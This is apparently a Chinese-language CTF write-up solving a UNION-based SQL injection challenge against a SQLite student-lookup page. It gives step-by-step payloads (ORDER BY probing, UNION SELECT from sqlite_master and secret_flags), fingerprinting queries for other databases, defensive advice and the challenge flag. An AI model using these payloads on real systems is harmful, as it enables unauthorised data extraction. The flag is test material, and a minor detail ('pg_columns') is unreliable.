# ✅ Web-50 解題說明 — UNION SQL Injection 實戰解析

## 題目描述
這是一個經典的 UNION-Based SQL Injection（基於聯集的 SQL 注入）題型。網頁上有一個查詢功能，允許查詢學生資料。由於輸入沒有經過過濾，駭客可以透過巧妙的 SQL 語法注入，利用 UNION 操作符把查詢結果與隱藏在資料庫裡的機密 Flag 合併輸出。

## 難度
★★★☆☆（3星）

## 種類
WEB

## 建議工具
- 瀏覽器網址列或開發者工具（F12 → Console）
- 記事本或終端機（組合 SQL Payload）

## 解題步驟

### 步驟一：尋找破綻 (Find the Injection Point)

**動作：** 在輸入框中輸入單引號 `'`

**背後原理：** 
- 正常的 SQL 語句：`WHERE sid = '輸入值'`
- 輸入單引號後變成：`WHERE sid = '''`
- 引號不配對會導致 SQL 語法錯誤

**觀察重點：** 
如果畫面出現紅色的「Database Error」訊息，恭喜你！這證明網頁沒有過濾輸入，你的單引號成功被當作 SQL 程式碼執行。

---

### 步驟二：資料庫指紋識別 (Database Fingerprinting)

在真實的攻擊中（黑箱測試），我們不知道後端是用哪種資料庫（MySQL, SQLite, PostgreSQL...），而每種資料庫的攻擊語法與系統目錄略有不同。我們必須先查出它的真實身分。

**方法 A：觀察錯誤訊息**

仔細看步驟一的報錯內容，不同資料庫有專屬的錯誤格式：

- **MySQL / MariaDB：** 通常包含 `You have an error in your SQL syntax...`
- **PostgreSQL：** 通常包含 `syntax error at or near...`
- **MSSQL：** 通常包含 `Unclosed quotation mark after the character string...` 或 `Incorrect syntax near...`
- **SQLite：** 錯誤訊息通常很短，例如 `unrecognized token: "'"` 或 `no such column`

**方法 B：測試專屬函數**

如果沒有報錯可以看（盲注或只有回顯），可以配合 UNION 測試各家專屬的函數，誰有反應就是誰（需在確認欄位數量後進行）：

- **MySQL / MSSQL：** 支援 `@@version`（例如：`UNION SELECT 1, @@version`）
- **PostgreSQL：** 支援 `version()`（例如：`UNION SELECT 1, version()`）
- **Oracle：** 需要從特定表查詢（例如：`UNION SELECT 1, banner FROM v$version`）
- **SQLite：** 支援 `sqlite_version()`（例如：`UNION SELECT 1, sqlite_version()`）

**方法 C：測試預設目錄**

測試資料庫的系統結構表 (System Schema)：

- 大多數主流資料庫（如 MySQL, PostgreSQL, MSSQL）都支援標準的 `information_schema` 目錄。
- 如果你嘗試讀取 `information_schema` 卻報錯，那極有可能是 SQLite 或 Oracle。

**本題結論：** 
綜合觀察本題的報錯內容與測試結果，我們可以初步判定後端使用的是 **SQLite** 資料庫，接下來的攻擊語法都要以 SQLite 為主。

---

### 步驟三：確認欄位數量 (Determine Column Count)

**鐵規則：** UNION 前後兩個查詢的「欄位數量」必須一模一樣。

**動作：** 依序輸入以下 Payload：

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

**背後原理：** 
- `ORDER BY 數字` = 用第幾個欄位排序
- `--` = SQL 註解符號，廢掉後面多餘的引號

**觀察重點：**
- 輸入 `' ORDER BY 1 --` → 畫面顯示「查無此人」（正常）
- 輸入 `' ORDER BY 2 --` → 畫面顯示「查無此人」（正常）
- 輸入 `' ORDER BY 3 --` → 系統報錯（沒有第 3 欄）

**結論：** 原始查詢有 **2 個欄位**。

---

### 步驟四：尋找回顯點 (Test for Reflection)

**動作：** 輸入一個不存在的學號並接上 UNION 查詢：

```
nonexistent' UNION SELECT '第一欄測試', '第二欄測試' --
```

**背後原理：** 
- 前半段「nonexistent」絕對找不到任何結果
- 最終結果只會剩下後半段 UNION 出來的假資料

**觀察重點：** 
畫面成功印出了自訂的資料。這證明我們成功控制了網頁的輸出！這兩個位置就是等一下要用來「塞入 Flag」的破口。

---

### 步驟五：打探資料庫結構並奪旗 (Reconnaissance & Capture The Flag)

**打探資料庫結構：**

在 SQLite 中，有一個內建目錄叫做 `sqlite_master`，存放所有資料表的建表語法。

```sql
nonexistent' UNION SELECT type, sql FROM sqlite_master --
```

**觀察重點：** 
仔細查看輸出，你會發現一個可疑的表格：
```
CREATE TABLE secret_flags (id INTEGER PRIMARY KEY, flag_value TEXT)
```

**結論：** 
- 目標資料表：`secret_flags`
- 目標欄位：`flag_value`

**最終奪旗：**

```sql
nonexistent' UNION SELECT id, flag_value FROM secret_flags --
```

**觀察重點：** 
畫面成功印出機密資訊，格式為 `SID: 1 - Name: FLAG{...}`

---

## 其他知識

### 不同資料庫的系統表查詢方法

**SQLite：**
- 系統表：`sqlite_master`
- 查詢語法：`SELECT type, sql FROM sqlite_master WHERE type='table'`
- 版本函數：`sqlite_version()`

**MySQL / MariaDB：**
- 系統資料庫：`information_schema`
- 查詢語法：`SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()`
- 查詢欄位：`SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME='表名'`
- 版本函數：`@@version`

**PostgreSQL：**
- 系統表：`pg_tables`, `pg_columns`
- 查詢語法：`SELECT tablename FROM pg_tables WHERE schemaname='public'`
- 版本函數：`version()`

**MSSQL：**
- 系統表：`sysobjects`, `syscolumns`
- 查詢語法：`SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES`
- 版本函數：`@@version`

**Oracle：**
- 系統表：`user_tables`, `user_tab_columns`
- 查詢語法：`SELECT table_name FROM user_tables`
- 版本查詢：`SELECT banner FROM v$version`

### UNION SQL Injection 的進階應用

- **盲注 (Blind SQLi)：** 當查詢結果不直接回顯時，可以用 UNION SELECT 配合 CASE / IF 邏輯進行位元攻擊
- **時間延遲注入 (Time-based Blind SQLi)：** 利用 `SLEEP()` 或 `BENCHMARK()` 函數來判斷條件是否成立
- **通用 Payload：** `UNION SELECT NULL, NULL, NULL...` 可以快速測試欄位數量（不依賴真實資料型態）
- **轉換資料型態：** 某些情況下需要用 `CAST()` 或 `CONVERT()` 轉換欄位型態，避免型態不匹配報錯

### 防禦方法

- **使用 Prepared Statements：** 將 SQL 語法與資料分離，是最有效的防禦方式
- **輸入驗證與過濾：** 驗證輸入是否符合預期格式（例如學號應該是 `s26XXX` 格式）
- **最小權限原則：** 資料庫帳戶只授予必要的權限，限制存取系統表
- **錯誤處理：** 避免在使用者界面上顯示詳細的資料庫錯誤訊息

---

## 驗證與常見卡點

- **驗證方式：** 最終輸出應符合 `FLAG{...}` 格式
- **常見卡點：** 忘記加註解符號 `--`，導致語句不完整
- **常見卡點：** UNION 前後欄位數量不一致，系統會報錯
- **常見卡點：** 確認輸入框確實是 GET 參數而非 POST，網址要正確編碼

## 學習重點

- **輸入驗證的重要性：** 即使看似簡單的查詢功能，若沒有過濾輸入也會引發嚴重漏洞
- **UNION 注入的威力：** 駭客可以把任何表格、任何欄位的資料「混入」合法查詢中
- **資料庫指紋識別：** 錯誤訊息與系統函數都能洩漏資料庫類型
- **ORDER BY 測試的實用性：** 這是探測欄位數量的標準流程，適用於所有 SQL Injection
- **sqlite_master 的危險性：** 系統表暴露了整個資料庫結構，防禦者必須限制存取權限

## Flag
`flag{un10n_sq1_1nj3ct10n_m4st3r}`
